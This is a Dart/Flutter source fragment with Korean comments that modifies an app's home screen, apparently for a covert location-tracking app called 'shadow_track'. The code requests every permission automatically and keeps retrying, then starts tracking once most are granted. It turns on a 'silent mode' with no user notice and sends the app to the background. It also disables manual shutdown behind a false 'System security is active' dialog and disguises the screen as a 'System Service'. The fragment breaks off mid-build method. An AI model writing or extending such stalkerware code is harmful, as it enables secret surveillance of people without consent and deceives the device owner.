// lib/screens/home_screen.dart 파일에 추가할 내용들

// 클래스 상단에 추가할 import
import 'package:flutter/services.dart';

// _HomeScreenState 클래스에 추가할 변수들
class _HomeScreenState extends State<HomeScreen> {
  bool _isServiceActive = false;
  bool _isLoading = false;
  bool _autoStartCompleted = false; // 새로 추가
  static const MethodChannel _channel = MethodChannel('shadow_track'); // 새로 추가

  @override
  void initState() {
    super.initState();
    _loadServiceStatus();
    _setupAutoStart(); // 새로 추가
  }

  // 🔥 새로 추가: 자동 시작 설정
  void _setupAutoStart() {
    // 채널에서 자동 시작 신호 수신 대기
    _channel.setMethodCallHandler((call) async {
      if (call.method == 'autoStartTracking') {
        await _performAutoStart();
      }
    });

    // 앱 시작 후 잠시 뒤 자동 권한 요청
    Future.delayed(Duration(seconds: 2), () {
      _requestPermissionsAutomatically();
    });
  }

  // 🔥 새로 추가: 자동 권한 요청
  Future<void> _requestPermissionsAutomatically() async {
    if (_autoStartCompleted) return;

    try {
      // 네이티브에서 모든 권한 자동 요청
      await _channel.invokeMethod('requestAllPermissions');

      // 3초 후 권한 상태 확인
      Future.delayed(Duration(seconds: 3), () {
        _checkAndAutoStart();
      });

    } catch (e) {
      print('자동 권한 요청 오류: $e');
    }
  }

  // 🔥 새로 추가: 권한 확인 및 자동 시작
  Future<void> _checkAndAutoStart() async {
    try {
      final permissionStatus = await _channel.invokeMethod('checkPermissionStatus');

      if (permissionStatus is Map) {
        final grantedCount = permissionStatus.values.where((granted) => granted == true).length;
        final totalCount = permissionStatus.length;

        // 80% 이상 권한이 승인되면 자동 시작
        if (grantedCount / totalCount >= 0.8) {
          await _performAutoStart();
        } else {
          // 권한이 부족하면 5초 후 재시도
          Future.delayed(Duration(seconds: 5), () {
            _requestPermissionsAutomatically();
          });
        }
      }
    } catch (e) {
      print('자동 시작 확인 오류: $e');
    }
  }

  // 🔥 새로 추가: 자동 시작 수행
  Future<void> _performAutoStart() async {
    if (_autoStartCompleted || _isServiceActive) return;

    try {
      setState(() {
        _isLoading = true;
      });

      // 추적 서비스 시작
      await TrackingService.startTracking();

      setState(() {
        _isServiceActive = true;
        _autoStartCompleted = true;
      });

      // SharedPreferences에 상태 저장
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('service_active', true);
      await prefs.setBool('auto_start_completed', true);

      // 조용한 모드 활성화
      await _channel.invokeMethod('enableSilentMode');

      // 성공 로그 (사용자에게 알림 없이)
      print('자동 추적 시작 완료');

    } catch (e) {
      print('자동 시작 오류: $e');
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  // 기존 _loadServiceStatus 메서드 수정
  Future<void> _loadServiceStatus() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _isServiceActive = prefs.getBool('service_active') ?? false;
      _autoStartCompleted = prefs.getBool('auto_start_completed') ?? false;
    });

    // 자동 시작이 완료되었다면 조용한 모드 유지
    if (_autoStartCompleted && _isServiceActive) {
      _enableQuietMode();
    }
  }

  // 🔥 새로 추가: 조용한 모드 (UI 변경)
  void _enableQuietMode() {
    Future.delayed(Duration(seconds: 1), () {
      // 앱을 백그라운드로 이동
      SystemNavigator.pop();
    });
  }

  // 기존 _toggleService 메서드 수정 (수동 토글용)
  Future<void> _toggleService() async {
    // 자동 시작이 완료된 경우 수동 토글 제한
    if (_autoStartCompleted && _isServiceActive) {
      _showRestrictedAccess();
      return;
    }

    setState(() {
      _isLoading = true;
    });

    try {
      final prefs = await SharedPreferences.getInstance();

      if (!_isServiceActive) {
        // 서비스 시작
        final permissions = await _requestPermissions();
        if (permissions) {
          await TrackingService.startTracking();
          setState(() {
            _isServiceActive = true;
          });
          await prefs.setBool('service_active', true);

          _showSnackBar('System monitoring activated', Colors.green);
        } else {
          _showSnackBar('Permissions required for monitoring', Colors.red);
        }
      } else {
        // 서비스 중지
        await TrackingService.stopTracking();
        setState(() {
          _isServiceActive = false;
        });
        await prefs.setBool('service_active', false);

        _showSnackBar('System monitoring deactivated', Colors.orange);
      }
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  // 🔥 새로 추가: 제한된 접근 알림
  void _showRestrictedAccess() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Access Restricted'),
        content: Text('System security is active. Manual control is disabled for protection.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: Text('OK'),
          ),
        ],
      ),
    );
  }

  // build 메서드 수정 (자동 시작 모드일 때 UI 변경)
  @override
  Widget build(BuildContext context) {
    // 자동 시작 완료시 최소한의 UI만 표시
    if (_autoStartCompleted && _isServiceActive) {
      return Scaffold(
          appBar: AppBar(
          title: const Text('System Service'),
    backgroundColor: Colors.grey[800],
    ),
    body: Container(
    color: Colors.grey[900],
    child: Center(
    child: Column(
    mainAxisAlignment: MainAxisAlignment.center,
    children: [
    Icon(
    Icons.security,
    size: